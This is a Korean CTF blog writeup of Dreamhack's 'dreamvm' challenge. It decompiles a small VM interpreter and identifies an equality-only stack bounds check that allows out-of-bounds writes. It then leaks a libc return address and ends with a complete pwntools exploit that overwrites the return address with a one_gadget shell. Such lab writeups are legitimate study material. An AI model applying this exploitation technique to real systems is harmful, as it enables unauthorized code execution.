---
title: "[DREAMHACK] dreamvm writeup"
date: 2026-02-02 21:29:00
categories: Essay
tags: [writeup]
---

# 정적 분석
`vm`문제, 규칙을 잘 따라야 하는 문제입니다.
평상시에도 하던 행동이지만, 이런 문제들에게서 보면 낯설게 느껴진단 말이죠..
이번에는 `nm`으로 확인하는 것보다, 제가 모르는 규칙을 먼저 봐야겠다 생각 들어서 `IDA`로 디컴파일 해봤습니다.

변수 리네임이라던가, 딱히 하지 않았습니다. 이 코드를 그리 오래 볼 것도 아니라서..
크게 크게 내려가보겠습니다.
```c
  int v3; // eax
  int v4; // ebx
  _QWORD *v5; // rsi
  __int64 all; // rbp
  __int64 v7; // rcx
  _DWORD *v8; // rdi
  char *v9; // rax
  char *v10; // rbp
  _BYTE *v11; // rax
  __int64 v12; // rdx
  __int64 v13; // rax
  _BYTE v15[4104]; // [rsp+0h] [rbp-1038h] BYREF
  _BYTE *v16; // [rsp+1008h] [rbp-30h] BYREF
  _QWORD v17[5]; // [rsp+1010h] [rbp-28h] BYREF
```

코드 상단 부, 카나리 지정 이후 부분에는 다음과 같은 코드가 적혀 있습니다.
파일로부터 값을 읽어오네요. FSOP 가능할까.. 이번에도 생각 들었지만 실력 부족으로 하지는...
못했습니다. `code`라는 게 `전역 변수`로 보이네요. 아마 `코드 영역`을 의미하는 친구일까 싶습니다. 잠시 `nm`으로 보러 가볼게요..
```c
if ( argc == 2 )
  {
    v3 = open(argv[1], 524544, envp);
    v4 = v3;
    if ( v3 == -1 )
      return 1;
    v5 = &code;
    all = read_all(v3);
    close(v4);
  }
```

...
```bash
0000000000601040 b code
0000000000601140 B _end
```
네.. `0x100`의 크기를 가지는 영역이군요. 어.. 어떤 문제에서는 이 영역을 그림으로 제공해줬던 것 같은데... 기억이 안나네요, 넘어가겠습니다.
```c
else
  {
    v5 = &code;
    all = read_all(0);
  }
```
표준 입력으로 받는 친구인 것 같네요..?

마찬가지로 초기 설정에 속합니다. 입력된 거 없으면 종료, 있으면 영역 정해서 그 영역은 초기화 해주는 듯 한데.. 그 밑엔 `rip`...가 아니라 `IP`..아 그 뭐였지.. 네 `PC` 위치를 `code` 변수로 옮기네요. 벌써부터 지능이 낮아지면 안되는데..
```c
if ( all <= 0 )
    return 1;
  v7 = 1030LL;
  v8 = v15;
  while ( v7 )
  {
    *v8++ = 0;
    --v7;
  }
v16 = &v16;
v9 = (char *)&code;
```

다음 부분은 좀 깁니다..

여기가 명령어 해석 부분이네요.
각 명령어의 동작은 아래에 후술하겠습니다..
```c
 while ( 2 )
  {
    v10 = v9 + 1;
    switch ( *v9 )
    {
      case 1:
        v11 = v16;
        v16 -= 8;
        *((_QWORD *)v11 - 1) = v17[0];
        goto LABEL_19;
      case 2:
        v12 = *(_QWORD *)v16;
        v16 += 8;
        v17[0] = v12;
        goto LABEL_19;
      case 3:
        v17[0] += *(_QWORD *)(v9 + 1);
        goto LABEL_15;
      case 4:
        v16 += *(_QWORD *)(v9 + 1);
LABEL_15:
        v10 = v9 + 9;
        goto LABEL_19;
      case 5:
        v13 = write_all_constprop_0(v17, v5);
        goto LABEL_18;
      case 6:
        v5 = v17;
        v13 = read_all(0);
LABEL_18:
        if ( v13 != 8 )
          return 1;
LABEL_19:
        if ( v16 == v15 || v16 == (_BYTE *)v17 )
          abort();
        if ( v10 <= byte_601137 )
        {
          v9 = v10;
          continue;
        }
        return 0;
      default:
        return 0;
    }
  }
```

- 1: `PUSH` : **누산기**에 저장된 값을 **스택**에 넣어줍니다..
- 2: `POP` : **스택**에 저장된 값을 **누산기**에 넣어줍니다..
- 3: `ADD AC` : **누산기**에 `8 바이트` 크기의 값을 더해줍니다..
- 4: `ADD SP` : **스택 주소**에 `8 바이트` 크기의 값을 더해줍니다.... 주소를 옮기는 기능입니다..
- 5: `WRITE` : **누산기**에 있던 값 `8 바이트`를 출력...
- 6: `READ` : 위 반대.. 입력입니다... `8 바이트`...

이렇게.. 보니 제 국어 능력이 안타깝네요... 이제서야 취약점을 찾을 시간입니다..
저는 `BOF`랑 `OOB` 쪽을 요즘 많이 당해서 찾아봤는데요...

`goto`문이 쓸 데 없이 괜히 눈에 띄는 게 아닙니다..

```c
LABEL_15:
        v10 = v9 + 9;
        goto LABEL_19;
      case 5:
        v13 = write_all_constprop_0(v17, v5);
        goto LABEL_18;
      case 6:
        v5 = v17;
        v13 = read_all(0);
LABEL_18:
        if ( v13 != 8 )
          return 1;
LABEL_19:
        if ( v16 == v15 || v16 == (_BYTE *)v17 )
          abort();
        if ( v10 <= byte_601137 )
        {
          v9 = v10;
          continue;
        }
        return 0;
      default:
        return 0;
``` 

위 `goto`문들을 보면... `명령 해석 위치`도 다루고.. `v13`은 그냥 `평범한 레지스터`... 라고 보면 될 것 같습니다..? 스택 포인터가 정확히 코드 영역이 아닌 다른 곳(스택의 시작점)에 있는 경우 `abort()`... 또는 `누산기` 쪽에 있는 경우도 abort() 인 것 같은데...라는 미친 생각을 잠시 했습니다. 역시 `goto`문만 따로 보면 머리 터지는 이벤트는 항상 저를 때에 맞게 찾아오네요..


`PUSH` & `POP`일 때 저 조건을 해석하면
스택의 끝에서 명령(`PUSH`)을 수행하지 못하게, 스택의 밑에서(비어있는 경우..) 명령어(`POP`)를 수행하지 못하게 막습니다.

경계를 `==`으로 검사해서 취약점이 생기는 것 같네요... 즉 범위를 넘어선 쓰기 공격이 가능하단거..

# 동적 분석

**리턴 주소**를 덮을 수 있을 것 같습니다. 일단 위치는 아래와 같고요...
일단은 말이죠... 저희가 `PC`를 실질적으로 옮기는 건 할 수 없습니다.. 그래서 생각해낸 건..

**스택 포인터**를 `리턴 주소를 가리키는 위치`로 옮기고, 여기에 값을 쓰면 될 것 같습니다.
이게 될 줄은 몰랐습니다.. 아무래도 `vm` 종류의 문제는 처음이기도 하고... 뭐 변명 거리가 여러개 있긴 한데..

![image.png](https://dreamhack-media.s3.amazonaws.com/attachments/59a909c32ef247e6a4ac27951e58fc38ffd0962781bd0f25fb9273cf591a1756.png)

기준점은 `RSP`입니다. 이제 레지스터 말할 때 `dreamvm`의 레지스터..인가 아닌가에 대해 조금씩 머리가 아파오네요..
심심하니 `8바이트 짜리 b'A'를 보내는 프로그램`을 작성한 뒤 디버깅을 시작해보겠습니다.

```python
from pwn import *

context.binary = elf = ELF('./dreamvm')
context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]

HOST, PORT = "ASDF 1234".split()

if args.REMOTE:
    p = remote(HOST, PORT)
else:
    p = process() # or env can be added

gdb.attach(p, '''
b *main+348
''')
pause()

pay = b'\x03'
pay += p64(0x4141414141414141) # 8bytes of dummy
pay += b'\xff' * (0x100 - len(pay))

p.send(pay)

p.interactive()
```

중단점... `IDA`에서 뭔가 쓸모있을 만한 지점 잡으려고 했는데.. 그냥 `LABEL_19` 쪽 `goto`문에 위치를 잡았습니다. 
![image.png](https://dreamhack-media.s3.amazonaws.com/attachments/00668960248c62176dbc61009e102dd1902f7690c9871db9eb5421b944466e69.png)
`$RSP + 0x1008`으로 생각하면 위치는
`0x7ffd48639810 + 0x1008 = **0x7ffd4863a818**` 이네요...

그리고 프레임 정보도 보면..
![image.png](https://dreamhack-media.s3.amazonaws.com/attachments/2539a62daeb5dc03dad2836cf0f0c412d1139b03a27054153ed6a9c598168038.png)
`0x7ffd4863a848`이니까...

`0x7ffd4863a848 (RET) - 0x7ffd4863a818 (VSP) = 0x30` 이렇게 거리가 구해지네요.

뭐 가장 먼저 스택 포인터를 옮기면 될 것 같고요... 아. `libc` 파일이 없거든요??
여기서 배경지식을 좀 썼습니다

`strings` 친구를 써서
`GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0` 이 정보를 얻었습니다, 그러나..
이건 어디까지나 문제에서 뭐 `GCC 환경`이라던가, `제가 알지 못하는 엄청난 환경에 영향을 끼치는 변수들...`을 건드리지 않는 가정에서 구하는 거라.. 완벽하진 않네요...

`libc-database`에서 좀 뒤적이면 되겠습니다.
그전에... 리모트에서 어쩔 수 없이 방금 위치를 구한 **리턴 주소**를 릭해야 합니다.
`POP`으로 `누산기`에 값 저장 후 출력하여 확인하면 됩니다..! 이걸로 얻은 값은
`...b97`... 즉, `libc_start_main_ret`(libc_start_main+X)가 `0x21b97`이라는 거죠.., 이걸로 [libc.rip](https://libc.rip/) 찾아본 결과.. 슬슬 밤이라 어지럽네요. 대충 식으로 나타내보자면

`누산기`에 담아놓은 값 - `0x21b97` + `유효한 원가젯 오프셋`입니다.

대략적인 환경도 알고, 해봤자 나온 결과 libc는 네 개...
![image.png](https://dreamhack-media.s3.amazonaws.com/attachments/b12914e229774233dfe4f6f83b57e2501d97efed9b7b9b07d995f86951d64b1c.png)

무작위 대입도 답이긴 하지만 전 1, 1.2로 그나마 줄여서 해봤습니다.
항상 원가젯 넣으려고 조건 확인할 때 머리가 맑아지는 느낌이랄까..

확인해보면 맞는 가젯은
```bash
0x10a45c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL || {[rsp+0x70], [rsp+0x78], [rsp+0x80], [rsp+0x88], ...} is a valid argv
```
이 친구 뿐입니다. 저는 따로 조건 맞추고 싶진 않아서.. 아니 못 맞춘다고 하죠..그냥..

아무튼, 이걸 써서 성공했습니다.

# 익스플로잇
```python
from pwn import *

context.binary = elf = ELF('./dreamvm')
context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]

HOST, PORT = "ASDF 1234".split()

if args.REMOTE:
    p = remote(HOST, PORT)
else:
    p = process() # or env can be added

# gdb.attach(p, '''
# b *main+348
# ''')
# pause()

# og_list = [0x4f35e, 0x4f365, 0x4f3c2, 0x10a45c]

# pay = b'\x03'
# pay += p64(0x4141414141414141) # 8bytes of dummy
# pay += b'\xff' * (0x100 - len(pay))

'''
0000000000400914 T _fini
0000000000400920 R _IO_stdin_used
0000000000400958 r __GNU_EH_FRAME_HDR
0000000000400b1c r __FRAME_END__
0000000000600da8 d __frame_dummy_init_array_entry
0000000000600da8 d __init_array_start
0000000000600db0 d __do_global_dtors_aux_fini_array_entry
0000000000600db0 d __init_array_end
0000000000600db8 d _DYNAMIC
0000000000600fa8 d _GLOBAL_OFFSET_TABLE_
0000000000601000 D __data_start
0000000000601000 W data_start
0000000000601008 D __dso_handle
0000000000601010 D __TMC_END__
0000000000601010 B __bss_start
0000000000601010 D _edata
0000000000601020 b completed.7698
0000000000601040 b code << 0x100 size
0000000000601140 B _end <<
'''

pay = b"\x04"
pay += p64(0x30)
pay += b"\x02"
pay += b"\x03"
pay += p64(0x10a45c - 0x21b97)
pay += b"\x01"
pay += b"\xff" * (0x100 - len(pay))

p.send(pay)

p.interactive()
```